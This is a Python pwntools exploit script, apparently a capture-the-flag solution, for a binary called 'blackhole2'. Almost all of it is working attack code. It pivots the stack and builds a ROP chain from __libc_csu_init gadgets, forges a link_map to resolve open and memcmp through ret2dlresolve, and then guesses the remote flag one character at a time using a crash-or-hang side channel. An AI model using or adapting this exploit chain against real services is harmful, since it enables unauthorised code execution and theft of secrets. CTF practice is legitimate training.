#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
from hashlib import sha256
from utils import *

code = ELF('./blackhole2')
libc = code.libc
context.arch = code.arch
context.log_level = 'error'
gadget = lambda x: next(code.search(asm(x, os='linux', arch=code.arch)))

#r = code.process()

def make_rop(function_ptr, args, rbp=None, rbx=0):
    caller, poper = csu_init
    if not rbp:
        rop = [poper,
               rbx,               # rbx
               1,               # rbp
               function_ptr-rbx*8,    # r12
               args[2],         # r13
               args[1],         # r14
               args[0],         # r15
               caller,
               ] + [0xdeadbeef] * 7
    else :
        rop = [poper,
               rbx,               # rbx
               1,               # rbp
               function_ptr-rbx*8,    # r12
               args[2],         # r13
               args[1],         # r14
               args[0],         # r15
               caller,
               ] + [1,2,rbp,4,5,6,7]
    return flat(rop)

pop_rdi = gadget('pop rdi; ret')
pop_rsi_pop = gadget('pop rsi; pop r15; ret')
leave_ret = gadget('leave; ret')
pop_r15_ret = pop_rsi_pop+1

link_map_addr = 0x601ee0
r_info = 0x000000000000007
offset = (libc.sym['open'] - libc.sym['read']) % 2**64
got_offset = (link_map_addr - 8 - offset) % 2**64 # rel_addr = link_map_addr - 8 writable
read_index = 0
csu_init = [0x400A10, 0x400A2A]
caller, poper = csu_init
#senders = []

link_map = ''
link_map = fake_link_map(code, libc, link_map_addr, 'read', 'open')
#log.info(len(link_map)) 280

plt0 = 0x4006C0
stack = 0x601100
filename = 0x601a00
ret_ptr = 0x601a00
ret = leave_ret + 1
flag_buf = 0x601b00
in_buf = 0x601c00
tmp_buf = 0x601d00
#offset_mp = (libc.symbols['mprotect'] - libc.symbols['read']) % 2**64
#got_offset_mp = (link_map_addr - 8 - offset_mp) % 2**64
flag = ''
fd = 3
offset_mp = (libc.symbols['memcmp']+64 - libc.symbols['read']) % 2**64
got_offset_mp = (link_map_addr - 8 - offset_mp) % 2**64
offset_movrdiraxcallrbx = (0x00000000000ece59-libc.sym['read']) % 2**64
got_offset_1 =(link_map_addr - 16 - offset_movrdiraxcallrbx) % 2**64

def dopow():
    chal = r.recvline().strip()
    x = iters.bruteforce(lambda sol:sha256(chal + sol).hexdigest().startswith('00000'), string.letters+string.digits, 4, method='fixed')
    r.send(x)

cur = args['CUR']

if args['LOCAL']:
    fd = 7

ip = args['IP']
port = args['PORT']
#pp = string.letters+string.digits+'{_ }'
pp = string.printable

for char in range(0x80):
    for guess in pp:
        r = remote(ip, port)
        print `cur + guess`
        #r = code.process()
        #raw_input('#')
        dopow()
        #r = remote('127.1', 4444)
        #r = remote(sys.argv[1], int(sys.argv[2]))
        #sc = '''
        #    mov rax, 0
        #    mov rdi, %d
        #    mov rsi, 0x601d00
        #    mov rdx, 0x80
        #    syscall
        #    mov rdi, 0x601d00
        #    mov al, byte ptr [rdi+%d]
        #    shr al, %d
        #    and al, 1
        #    cmp al, 0
        #flag:
        #    je flag
        #    mov rax, 0x3c
        #    syscall
        #''' % (fd, char, bit)
        #print sc
        #sc = asm(sc)
        p = flat(
            0xdeadbeef,
            make_rop(code.got['read'], [0, link_map_addr, 0x118]),
            make_rop(code.got['read'], [0, code.got['alarm']+5, 1]),
            make_rop(code.got['read'], [0, filename, 7]), # 0x120
            pop_rdi, filename,
            pop_rsi_pop, 0, 0,
            plt0+6, link_map_addr, 0, # open('flag', 0)

            make_rop(code.got['read'], [fd, flag_buf, 0x80]),
            make_rop(code.got['read'], [0, link_map_addr, 8]),
            make_rop(code.got['read'], [0, link_map_addr+0x108, 8]),
            make_rop(code.got['read'], [0, in_buf, 0x80]),
            make_rop(code.got['read'], [0, ret_ptr, 8]), # 0x118
            make_rop(ret_ptr, [flag_buf, in_buf, len(cur+guess)]),
            plt0+6, link_map_addr, 0, # memcmp(flag, cur, len)

            make_rop(code.got['read'], [0, link_map_addr, 8]),
            make_rop(code.got['read'], [0, link_map_addr+0x108, 8]),
            0x400A2A, pop_r15_ret,2,3,4,5,6,
            plt0+6, link_map_addr, 0, # mov rdi, rax call rbx

            make_rop(code.got['read'], [0, stack, 0x400]),
            make_rop(code.got['read'], [0, stack, 0x90+0xf0]),
            make_rop(link_map_addr-8, [flag_buf, in_buf, len(cur+guess)]), # memcmp
            make_rop(link_map_addr-16, [1,tmp_buf,0x1000], rbx=code.plt['read']), # mov rdi, rax; call read
            #make_rop(code.got['read'], [0, 0x601a00, len(sc)]),
            #0x601a01,
        )
        #senders.extend([link_map, ''])
        # q -> rop1
        # p -> rop2
        q = flat(
            'A'*32,
            stack,
            make_rop(code.got['read'], [0, stack, len(p)], stack),
            leave_ret
        )
        #info('%016x stack', stack)
        #info('%016x len(p)', len(p))
        #log.info(len(q)) #168
        q = q.ljust(0x100, '\x00')
        #r.send(q)
        #log.info(len(p))
        r.send(q+flat(
            p,
            link_map,
            '\x03',
            'flag\x00\x00\x00',
            offset_mp,
            got_offset_mp,
            (cur+guess).ljust(0x80, '\x00'),
            ret,
            offset_movrdiraxcallrbx,
            got_offset_1,
        ).ljust(0x1000-0x100, '\x00'))
        #r.interactive()
        r.send('233')
	try:
            r.recv(timeout=int(args['T']))
        except EOFError:
            warning(guess)
            r.close()
        else:
            success(cur+guess)
            r.close()
            cur += guess
            break
